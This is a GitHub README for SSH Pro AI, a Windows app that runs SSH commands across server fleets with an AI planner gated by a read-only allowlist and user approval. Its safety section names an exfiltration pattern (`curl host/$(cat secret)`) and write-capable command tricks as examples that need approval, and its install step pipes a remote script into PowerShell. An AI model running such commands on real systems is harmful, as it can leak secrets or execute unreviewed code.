<div align="center">

<img src="web/icon.png" width="96" alt="SSH Pro AI icon">

# SSH Pro AI

**Your whole Linux server fleet in one Windows app: real SSH terminals, parallel commands,
and an AI ops assistant that plans the work while *you* stay in control.**

[![Tests](https://github.com/souvik-das-tech/ssh-pro-ai/actions/workflows/tests.yml/badge.svg)](https://github.com/souvik-das-tech/ssh-pro-ai/actions/workflows/tests.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
![Built with Rust](https://img.shields.io/badge/built%20with-Rust-B7410E.svg)
![Platform: Windows](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6.svg)

</div>

---

> *"Check free disk space on every server."*
> *"Which servers don't have PHP? Show me a table."*
> *"There's a new Node.js security patch. Update it everywhere Node is installed."*
> *"Build this project, upload it to /var/www/app and restart it with pm2."*

Type that, and SSH Pro AI works out the commands for each server, runs the safe read-only ones on
all of them in parallel, **asks you before anything that changes a server**, and answers with a
clean table.

## Why SSH Pro AI?

Managing 5, 20 or 50 servers usually means juggling PuTTY windows, copy-pasting the same command
again and again, and keeping notes on which box runs what. SSH Pro AI puts every server in one
window and lets an AI do the repetitive part without ever handing it the keys.

- 🖥️ **All servers in one place**: folders, tags, pins, online status and OS at a glance.
- ⌨️ **Real terminals**: xterm.js tabs, tiled view, and **broadcast typing** (type once, send to
  many terminals).
- ⚡ **Parallel commands**: run one command on a whole folder or the whole fleet at once
  (**Direct** mode, no AI needed).
- 🤖 **AI ops chat**: plain-language requests in English, Banglish or Hinglish, answered with a
  per-server table. The AI can also search the web for CVEs, release notes and latest versions.
- 🧠 **Pick your model**: Gemini, Claude and GPT-OSS through the AGY CLI. Switch any time, or let
  **⚡ Auto** pick a fast model for quick checks and a smart one for troubleshooting, security
  and changes.
- 🛡️ **Safe by design**: an allowlist decides what counts as read-only. Everything else waits for
  your approval and rolls out **canary-first** (one server, then the rest).
- 🔐 **Secrets never leave your PC**: SSH keys and passwords are encrypted with Windows DPAPI.
  The AI only sees server names, folders, tags, user and OS: **never IPs, passwords or keys**.
  Keys, passwords and tokens that show up in command output are masked before the AI sees them.
- 🔁 **Server to server**: copy data or stream a database dump from one server into another,
  checked on both sides, with nothing stored on your PC.
- 📦 **Uploads and downloads**: send a file or folder from your PC to many servers (folders travel
  as one archive), or pull backups down into Downloads.
- 🧾 **Audit log**: every prompt, command, server and result is recorded.
- 💾 **Backup and restore**: move your whole server list to another PC in one file.
- 🌗 **Light and dark mode**, and a sidebar that folds into a slim rail.
- 🪶 **Small and native**: one ~13 MB Rust app; the installer is about 6 MB.

## Install

Download **`SSH-Pro-AI-Setup-<version>.exe`** and run it. It installs for your Windows user (no
admin rights needed), adds Start menu and desktop shortcuts, and can be removed from
**Settings > Apps**. If the PC lacks the Microsoft Edge WebView2 Runtime (it ships with
Windows 11), the setup installs it. Installing a newer setup updates the app in place.

The setup is not code-signed yet, so the first time Windows SmartScreen may show "Windows
protected your PC": choose **More info > Run anyway**.

Open **SSH Pro AI** and add your first server with **Add server**. SSH, terminals and Direct mode
work right away; only the AI chat needs the AGY CLI.

### Enable the AI chat (AGY CLI)

The AI runs through the **AGY (Antigravity) CLI** installed on your own PC, so nothing needs to
be installed on your servers.

```powershell
irm https://antigravity.google/install.ps1 | iex
# or
winget install Google.AntigravityCLI
```

Then run `agy` once in a terminal, sign in, and restart SSH Pro AI.
Guide: <https://docs.flutter.dev/ai/antigravity-cli>

AGY only plans: in headless mode its own tools are auto-denied, so the app stays the only thing
that runs commands.

### Pick a model

Pick a model from the dropdown in the chat toolbar and switch whenever you like (a switch starts a
new chat). The list comes live from `agy models`, so new models show up without an app update.

**⚡ Auto** picks the model per request, locally and instantly (no extra AI call). Quick checks
and chat ("disk space koto?", "node version") go to the **Fast** model. Troubleshooting ("502
keno?"), security/CVE questions, installs, deploys, config changes and long requests go to the
**Smart** model. Pick both models next to the dropdown; by default the model you used before
becomes Smart, and the fastest Gemini Flash becomes Fast. A chat that needed the Smart model
stays on it, and if the Fast model fails a round, the Smart model takes that round over with the
chat so far. The status line shows which model is working and why.

## How the AI works

```
 You: "update Node.js where it's installed"
        │
        ▼
 ┌──────────────┐  server list (names, folders, tags, OS; no IPs, no secrets)
 │   AGY CLI    │◄──────────────────────────────────────────────┐
 │  (planner)   │   outputs with secrets masked                 │
 └──────┬───────┘                                               │
        │ JSON plan: steps, risk, rollout                       │
        ▼                                                       │
 ┌──────────────┐  read-only?  ──yes──► run on all servers now  │
 │ Safety check │                                               │
 │ (allowlist)  │  may change? ──────► ask you → canary → rest  │
 └──────────────┘                              │                │
                                               ▼                │
                              outputs from every server ────────┘
                                               │
                                               ▼
                                 answer + per-server table
```

1. Your message and a **redacted** server list go to the AGY CLI.
2. The AI replies with a JSON plan: which servers, which commands, how risky.
3. SSH Pro AI checks every command against its own **read-only allowlist**. It never trusts the
   AI's own risk label on its own.
4. Read-only steps run immediately in parallel. Anything else (install, restart, delete, upload,
   local commands, server-to-server copies) is shown to you first and needs **Approve**.
5. Results go back to the AI for analysis (up to 10 rounds), and you get a summary and a table.
   Servers with the same output are grouped and long output is cut to its start and end, so a
   big fleet costs few tokens.

**Nothing changes without your OK.** A step runs at once only if the app's own allowlist says it
just reads, whatever risk the AI claims. Tools that look harmless but can write or run things
(`sed 's/x/y/w file'`, `sort -o`, `curl -o`, `awk 'print > f'`, `env rm`, `git branch -D`,
`systemctl --failed restart x` …) need approval. So do network commands that could carry server
data out (`curl host/$(cat secret)`, data piped into `openssl s_client`). Before output goes to
the AI, private keys, passwords, tokens and password hashes are replaced with `[REDACTED]`. Your
screen and the audit log still show the full output.

## Working on your PC too

The AI can also plan steps on the Windows PC running the app:

- **Local PowerShell**: find a file, `git status`, `npm run build`, pack a folder.
- **Upload**: local file or folder → servers over SFTP. A folder is packed into one `.tar.gz`,
  sent in one transfer, unpacked on the server, and the archive is removed on both sides.
- **Download**: server file or folder → this PC (Downloads by default, one subfolder per server).
  Existing files are never overwritten: a copy becomes `name (2).sql.gz`. For root-owned files the
  AI first copies them to `/tmp` with `sudo`, then cleans up.

Read-only local checks (`Get-ChildItem`, `git status`, `node -v`) run at once. Every other local
command, upload and download needs your approval.

## Your data

| What | Where |
|---|---|
| Servers, audit log (kept 5 days), chat history | `%LOCALAPPDATA%\SSH-Pro-AI\sshpro.sqlite3` |
| Logs | `%LOCALAPPDATA%\SSH-Pro-AI\logs\` |
| Chosen AI model, Auto models, light/dark | `%LOCALAPPDATA%\SSH-Pro-AI\settings.json` |

Passwords, private keys, key passphrases and sudo passwords are encrypted with **Windows DPAPI**,
so they can only be decrypted by your Windows user on this PC. Uninstalling the app keeps this
folder. Data from the earlier Python version of SSH Pro AI opens as it is.

### Backup and restore

Because DPAPI is tied to your Windows account, copying the database file to another PC loses all
credentials. Use **Backup** in the sidebar instead. It exports a `.sshpro` file with all servers
and their credentials **in plain text**, so treat it like the keys themselves. Restoring it (on
any PC) adds the servers and skips ones already present (same host, port and user). Nothing is
overwritten or deleted.

### Import from Termix

Put a Termix export named `ssh.sqlite` next to `sshpro.exe` and it is imported on first start,
or use **Import** in the sidebar. That file contains plain-text secrets and is git-ignored.

## Configuration

| Environment variable | Purpose |
|---|---|
| `SSHPRO_AGY` | Path to `agy.exe` if it is installed somewhere non-standard |
| `SSHPRO_AGY_MODEL` | Default AI model (the dropdown choice overrides it) |
| `SSHPRO_DATA_DIR` | Use a different data folder (handy for testing) |
| `SSHPRO_LOG` | Log detail, e.g. `debug` (default `info`) |

## Build from source

Requirements: Windows 10/11, [Rust](https://rustup.rs) and a MinGW gcc for the C parts (ring,
SQLite). Building the installer also needs Inno Setup 6.

```bat
winget install BrechtSanders.WinLibs.POSIX.UCRT
winget install JRSoftware.InnoSetup
git clone https://github.com/souvik-das-tech/ssh-pro-ai.git
cd ssh-pro-ai
build.cmd        :: -> target\release\sshpro.exe (+ WebView2Loader.dll, keep them together)
installer.cmd    :: -> target\installer\SSH-Pro-AI-Setup-<version>.exe
```

`cargo test` runs the test suite: the command safety classifier, secret masking, the database,
backups, the Termix import, folder transfers, the HTTP token guard, and the AI job loop with a
scripted AI, so no real servers or AGY account are needed.

`target\release\sshpro.exe --serve` starts only the backend and prints a URL to open in a
browser, which is handy when working on the UI (`web/`). See
[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for a tour of the code.

## Roadmap

- [ ] SFTP file manager in the UI
- [ ] SSH port tunnels
- [ ] Scheduled health checks (daily disk/RAM/updates report)
- [ ] Code-signed installer
- [ ] macOS / Linux support (replace DPAPI with the OS keychain)

Ideas and votes welcome in [Issues](https://github.com/souvik-das-tech/ssh-pro-ai/issues).

## Contributing

Pull requests are welcome! Read [CONTRIBUTING.md](CONTRIBUTING.md) to get started, and please
report security problems privately as described in [SECURITY.md](SECURITY.md).

If SSH Pro AI saves you time, **please give it a ⭐**. It helps other people find it.

## License

[MIT](LICENSE) © 2026 Souvik Das. Bundled third-party code is listed in
[THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).

> SSH Pro AI is an independent project and is not affiliated with Google, Antigravity or Termix.
